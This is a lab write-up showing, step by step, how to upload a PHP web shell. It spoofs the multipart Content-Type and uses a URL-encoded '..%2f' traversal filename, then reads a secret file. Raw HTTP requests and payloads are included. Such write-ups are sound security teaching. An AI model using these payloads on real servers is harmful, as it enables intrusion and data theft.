# Web shell upload via path traversal

This lab contains a vulnerable image upload function. It doesn't perform any validation on the files users upload before storing them on the server's filesystem.

To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file `/home/carlos/secret`. Submit this secret using the button provided in the lab banner.

You can log in to your own account using the following credentials: `wiener:peter`

---

## 1. Detection

- Opened the Lab URL and clicked on <a href="/my-account?id=wiener">My Account</a> and logged in with given credentials `wiener:peter`.
- The page had option to upload an avatar.
- I uploaded a normal image file and captured the request in <a href="https://portswigger.net/burp/downloads">BurpSuite</a>.
- A `POST /my-account/avatar` was being sent, I right clicked on the request and sent it to `Repeater` tab to start playing with it.
```http
POST /my-account/avatar HTTP/2
Host: <REDACTED_HOST>
Cookie: session=<REDACTED_SESSION>
Content-Length: 529
Cache-Control: max-age=0
Sec-Ch-Ua: <REDACTED>
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: <REDACTED>
Dnt: 1
Upgrade-Insecure-Requests: 1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryotTPzPfnxBJhA76G
User-Agent: <REDACTED>
Origin: <REDACTED_ORIGIN>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: <REDACTED_REFERER>
Accept-Encoding: gzip, deflate, br
Accept-Language: en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7
Priority: u=0, i

------WebKitFormBoundaryotTPzPfnxBJhA76G
Content-Disposition: form-data; name="avatar"; filename="test.txt"
Content-Type: text/plain

test
------WebKitFormBoundaryotTPzPfnxBJhA76G
Content-Disposition: form-data; name="user"

wiener
------WebKitFormBoundaryotTPzPfnxBJhA76G
Content-Disposition: form-data; name="csrf"

<REDACTED_CSRF_TOKEN>
------WebKitFormBoundaryotTPzPfnxBJhA76G--
```
- I changed the file extension to `.txt` and set the content-type to `text/plain`, but the server rejected it with a `403 Forbidden`:
```http
HTTP/2 403 Forbidden
Date: Wed, 10 Jun 2026 10:52:31 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Type: text/html; charset=UTF-8
X-Frame-Options: SAMEORIGIN
Content-Length: 224

Sorry, file type text/plain is not allowed
        Only image/jpeg and image/png are allowed
Sorry, there was an error uploading your file.<p><a href="/my-account" title="Return to previous page">« Back to My Account</a></p>
```
- This told me the server was validating the `Content-Type` header, not the actual file extension or content. So I kept the filename as `test.txt` but changed the part-level `Content-Type` to `image/png` and resent the request — the server accepted it and returned the upload path.
```http
HTTP/2 200 OK
Date: <REDACTED_DATE>
Server: <REDACTED_SERVER>
Vary: Accept-Encoding
Content-Type: text/html; charset=UTF-8
X-Frame-Options: SAMEORIGIN
Content-Length: 132

The file avatars/test.txt has been uploaded.
<p><a href="/my-account" title="Return to previous page">« Back to My Account</a></p>
```
- This confirms the server only checks the `Content-Type` header in the multipart form data — not the file extension or actual file content — which makes it trivially bypassable and opens the door to uploading arbitrary code.

---

## 2. Code Execution
- I changed the filename to `test.php`, kept the part-level `Content-Type` as `image/png` to bypass the restriction, and uploaded a harmless PHP snippet to verify code execution.
- The file uploaded successfully, but visiting `/avatars/test.php` did not execute the code — the server returned it as a static file. This indicated the `avatars` directory was likely configured to serve files statically, preventing PHP execution.
- To get around this, I tried a path traversal payload in the filename — `../bg.php` — to upload the shell one directory above `avatars`, where execution might be permitted.
```http
------WebKitFormBoundaryotTPzPfnxBJhA76G
Content-Disposition: form-data; name="avatar"; filename="../bg.php"
Content-Type: image/png

<?php
    echo 1+1;
?>
------WebKitFormBoundaryotTPzPfnxBJhA76G
```
- However, the server still responded with:
```http
HTTP/2 200 OK
Date: Wed, 10 Jun 2026 11:17:45 GMT
Server: Apache/2.4.41 (Ubuntu)
Vary: Accept-Encoding
Content-Type: text/html; charset=UTF-8
X-Frame-Options: SAMEORIGIN
Content-Length: 130

The file avatars/bg.php has been uploaded.
<p><a href="/my-account" title="Return to previous page">« Back to My Account</a></p>
```
- The response showed `avatars/bg.php` — meaning the server was stripping the `../` before saving the file. After several attempts, I suspected it might only be stripping literal slashes while leaving URL-encoded ones intact. So I URL-encoded the slash and tried `..%2fbg.php` as the filename.
```http
------WebKitFormBoundaryotTPzPfnxBJhA76G
Content-Disposition: form-data; name="avatar"; filename="..%2fbg.php"
Content-Type: image/png

<?php
    echo 1+1;
?>
------WebKitFormBoundaryotTPzPfnxBJhA76G
```
- This time, the response confirmed the traversal worked:
```http
HTTP/2 200 OK
Date: Wed, 10 Jun 2026 11:17:45 GMT
Server: Apache/2.4.41 (Ubuntu)
Vary: Accept-Encoding
Content-Type: text/html; charset=UTF-8
X-Frame-Options: SAMEORIGIN
Content-Length: 130

The file avatars/../bg.php has been uploaded.
<p><a href="/my-account" title="Return to previous page">« Back to My Account</a></p>
```
- The path `avatars/../bg.php` in the response confirmed the file landed outside the `avatars` directory. I visited `/files/bg.php` and the server displayed `2` — confirming PHP execution was working.

---

## 3. Solve the Challenge
- The challenge was to print the content of the `/home/carlos/secret` file which contains a secret and submit the same.
- I simply modified the code from
```php
<?php
    echo 1+1;
?>
```
to
```php
<?php
    $flag_path='/home/carlos/secret';
	$content=file_get_contents($flag_path);
    echo $content;
?>
```
- Forwarded the request again with the same `..%2fbg.php` filename and the code was uploaded on the server.
- Simply refreshed `/files/bg.php` and got the flag:-
`ZX8nf3k7G8NqRL3N9cUxbi7XrqllVDUr`.
- Submitted the same and solved the challenge.